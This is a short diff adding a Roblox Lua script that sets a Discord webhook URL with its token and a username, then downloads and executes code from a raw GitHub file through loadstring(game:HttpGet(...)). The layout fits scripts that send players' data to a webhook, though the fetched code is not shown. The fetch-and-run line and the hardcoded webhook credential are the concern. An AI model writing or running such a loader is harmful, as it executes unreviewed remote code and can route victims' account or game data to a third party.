@@ -1,0 +1,4 @@
+Webhook = "https://discordapp.com/api/webhooks/1353076835000389693/OsGngCj483CuGQ0PU-fugZ3sL_ia0KhWZyvd4D9JZSkwmmGE_mzTcveo1DwVnKuylQ6M" -- << Ur webhook
+Username = "ABC123" -- << Ur username
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
